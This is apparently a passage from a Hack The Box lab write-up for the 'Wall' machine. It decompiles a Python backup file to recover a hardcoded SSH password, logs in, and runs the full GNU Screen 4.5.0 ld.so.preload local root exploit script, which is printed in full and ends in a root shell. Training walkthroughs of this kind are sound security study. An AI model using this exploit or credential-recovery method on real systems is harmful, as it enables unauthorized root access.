+FgEWARYBFgEWARYBFgEWARYBFgEWBBYCEgMQAg==
+
+
+
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $vim backup.b64
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $base64 -d backup.b64 
+�
+^V@]c@stddlZdZdZdZejeef�ZdZeed��7Zeed��7Zee��7Zeed	��7Zeed
+��7Zeed
+       ��7Zeed
+��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zeed��7Zej	ded�e�ej
+j
+ e�Z
+    e
+d�dGHdS(i����Ntshelbywall.htbittSthtetltbtytPtatstwt@trtdtItttotntgt!usernamepasswords/var/www/html.ziphtml.zips
+[+] Done !(paramikoRthosttportt	Transportt	transportRtchrtordtconnectt
+SFTPClienttfrom_transportt
+                          sftp_clienttput(((s	backup.py<module>s@
+                                                                   ┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $base64 -d backup.b64 > backup
+====================================================================================================================================
+
+Let's go back to the server and run the file with backup 
+Commands and Output:
+====================================================================================================================================
+www-data@Wall:/opt/.shelby$ python backup 
+[+] Done !
+www-data@Wall:/opt/.shelby$ cd /home/shelby/
+www-data@Wall:/home/shelby$ ls
+html.zip  user.txt
+www-data@Wall:/home/shelby$ ls -la
+total 48
+drwxr-xr-x 6 shelby shelby 4096 Jul 30  2019 .
+drwxr-xr-x 4 root   root   4096 Jul  4  2019 ..
+lrwxrwxrwx 1 root   root      9 Jul  6  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 shelby shelby  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 shelby shelby 3771 Apr  4  2018 .bashrc
+drwx------ 2 shelby shelby 4096 Jul  4  2019 .cache
+drwx------ 3 shelby shelby 4096 Jul  4  2019 .gnupg
+drwxrwxr-x 3 shelby shelby 4096 Jul  4  2019 .local
+-rw-r--r-- 1 shelby shelby  807 Apr  4  2018 .profile
+drwxr-xr-x 2 shelby shelby 4096 Jul  4  2019 .rpmdb
+-rw-rw-r-- 1 shelby shelby 4567 May 14 07:40 html.zip
+-rw------- 1 shelby shelby   33 May 14 04:01 user.txt
+====================================================================================================================================
+
+Apparently running the backup pyc file updates the html.zip file which does some kind of authentication to update the file.
+Python compiled files are reversible. Can install uncompyle2 on python2.7 with following commands
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $git clone https://github.com/wibiti/uncompyle2.git
+Cloning into 'uncompyle2'...
+remote: Enumerating objects: 700, done.
+remote: Total 700 (delta 0), reused 0 (delta 0), pack-reused 700
+Receiving objects: 100% (700/700), 920.47 KiB | 4.87 MiB/s, done.
+Resolving deltas: 100% (381/381), done.
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $cd uncompyle2/
+sudo python2 setup.py install
+running install
+running build
+running build_py
+running build_scripts
+running install_lib
+creating /usr/local/lib/python2.7/dist-packages/uncompyle2
+copying build/lib.linux-x86_64-2.7/uncompyle2/Parser.py -> /usr/local/lib/python2.7/dist-packages/uncompyle2
+copying build/lib.linux-x86_64-2.7/uncompyle2/Scanner.py -> /usr/local/lib/python2.7/dist-packages/uncompyle2
+copying build/lib.linux-x86_64-2.7/uncompyle2/Walker.py -> /usr/local/lib/python2.7/dist-packages/uncompyle2
+copying build/lib.linux-x86_64-2.7/uncompyle2/__init__.py -> /usr/local/lib/python2.7/dist-packages/uncompyle2
+copying build/lib.linux-x86_64-2.7/uncompyle2/magics.py -> /usr/local/lib/python2.7/dist-packages/uncompyle2
+copying build/lib.linux-x86_64-2.7/uncompyle2/spark.py -> /usr/local/lib/python2.7/dist-packages/uncompyle2
+copying build/lib.linux-x86_64-2.7/uncompyle2/verify.py -> /usr/local/lib/python2.7/dist-packages/uncompyle2
+byte-compiling /usr/local/lib/python2.7/dist-packages/uncompyle2/Parser.py to Parser.pyc
+byte-compiling /usr/local/lib/python2.7/dist-packages/uncompyle2/Scanner.py to Scanner.pyc
+byte-compiling /usr/local/lib/python2.7/dist-packages/uncompyle2/Walker.py to Walker.pyc
+byte-compiling /usr/local/lib/python2.7/dist-packages/uncompyle2/__init__.py to __init__.pyc
+byte-compiling /usr/local/lib/python2.7/dist-packages/uncompyle2/magics.py to magics.pyc
+byte-compiling /usr/local/lib/python2.7/dist-packages/uncompyle2/spark.py to spark.pyc
+byte-compiling /usr/local/lib/python2.7/dist-packages/uncompyle2/verify.py to verify.pyc
+running install_scripts
+copying build/scripts-2.7/uncompyle2 -> /usr/local/bin
+changing mode of /usr/local/bin/uncompyle2 to 755
+running install_egg_info
+Writing /usr/local/lib/python2.7/dist-packages/uncompyle2-1.1.egg-info
+====================================================================================================================================
+
+To decomyple we just run the command.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $uncompyle2 backup
+# 2021.05.13 21:58:02 PDT
+#Embedded file name: backup.py
+import paramiko
+username = 'shelby'
+host = 'wall.htb'
+port = 22
+transport = paramiko.Transport((host, port))
+password = ''
+password += chr(ord('S'))
+password += chr(ord('h'))
+password += chr(ord('e'))
+password += chr(ord('l'))
+password += chr(ord('b'))
+password += chr(ord('y'))
+password += chr(ord('P'))
+password += chr(ord('a'))
+password += chr(ord('s'))
+password += chr(ord('s'))
+password += chr(ord('w'))
+password += chr(ord('@'))
+password += chr(ord('r'))
+password += chr(ord('d'))
+password += chr(ord('I'))
+password += chr(ord('s'))
+password += chr(ord('S'))
+password += chr(ord('t'))
+password += chr(ord('r'))
+password += chr(ord('o'))
+password += chr(ord('n'))
+password += chr(ord('g'))
+password += chr(ord('!'))
+transport.connect(username=username, password=password)
+sftp_client = paramiko.SFTPClient.from_transport(transport)
+sftp_client.put('/var/www/html.zip', 'html.zip')
+print '[+] Done !'
++++ okay decompyling backup 
+# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
+====================================================================================================================================
+
+We modify some of the fields and just print the password.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $python2 backup.out
+ShelbyPassw@rdIsStrong!
+====================================================================================================================================
+
+We can now simply use ssh for it.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $ssh -l shelby 10.10.10.157
+The authenticity of host '10.10.10.157 (10.10.10.157)' can't be established.
+ECDSA key fingerprint is SHA256:rUe3KWmT3ZJhKW+86+Zm8EKcgYr9TPlkU+W962iQEUY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.157' (ECDSA) to the list of known hosts.
+shelby@10.10.10.157's password: 
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-54-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Wed Nov 18 11:42:30 2020
+shelby@Wall:~$ 
+====================================================================================================================================
+
+We can now run linpeas on the box to further enumerate and try to escalate
+After running linpeas, we see that screen is a setuid file owned by root
+Commands and Output:
+====================================================================================================================================
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwsr-xr-x 1 root root        31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root        19K Mar 10  2017 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root        63K Mar 10  2017 /bin/ping
+-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root       146K Jan 18  2018 /usr/bin/sudo  --->  /sudo$
+-rwsr-xr-x 1 root root        27K Oct 15  2018 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root        43K Oct 15  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root       427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root        59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root        40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root        75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root        44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root        75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root        44K Mar 22  2019 /bin/su
+-rwsr-xr-- 1 root messagebus  42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root       1.6M Jul  4  2019 /bin/screen-4.5.0
+====================================================================================================================================
+
+We can try and search on gtfo bins and see if there is an exploit for this version of screen.
+We find an exploit that let's us write to a file as root, there is apparently a working exploit on searchsploit so let's check it out
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $searchsploit screen
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Advanced Desktop Locker 6.0.0 - Lock Screen Bypass                                                      | windows/local/40995.txt
+Amateur Photographer's Image Gallery - 'fullscreen.php?albumid' SQL Injection                           | php/webapps/37963.txt
+Apple iOS 7.0.2 - Sim Lock Screen Display Bypass                                                        | ios/webapps/28978.txt
+..
+..
+..
+GNU Screen 4.5.0 - Local Privilege Escalation                                                           | linux/local/41154.sh
+GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                     | linux/local/41152.txt
+====================================================================================================================================
+
+We check out the "linux/local/41154.sh" exploit to our directory
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/wall]
+└──╼ $cat 41154.sh 
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017) 
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell
+====================================================================================================================================
+
+
+We run the exploit and become root immediately. For more info on the exploit check the haircut video.
+Commands and Output:
+====================================================================================================================================
+shelby@Wall:~$ ./screen.sh 
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+/tmp/libhax.c: In function ‘dropshell’:
+/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’; did you mean ‘chroot’? [-Wimplicit-function-declaration]
+..
+..
+..
+..
+..
+..
+/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
+     execvp("/bin/sh", NULL, NULL);
+     ^~~~~~
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-shelby.
+
+# id
+uid=0(root) gid=0(root) groups=0(root),6001(shelby)
+====================================================================================================================================
